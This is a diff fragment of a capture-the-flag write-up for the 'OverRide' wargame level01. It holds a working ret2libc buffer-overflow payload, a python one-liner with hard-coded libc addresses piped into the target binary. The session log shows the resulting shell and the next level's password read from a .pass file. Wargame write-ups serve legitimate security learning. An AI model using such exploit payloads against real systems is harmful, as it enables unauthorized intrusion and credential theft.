@@ -109,7 +109,6 @@ Why bother add the ```exit()```? Because if we don't, then the shell will segfau
 Let's build our attack payload:
 
 [ 80 x "A" ] [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
-(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01
 
 ```
 level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01
@@ -123,7 +122,6 @@ whoami
 level02
 cat /home/users/level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
-
 ``` 
 
 ## Recreate Exploited Binary
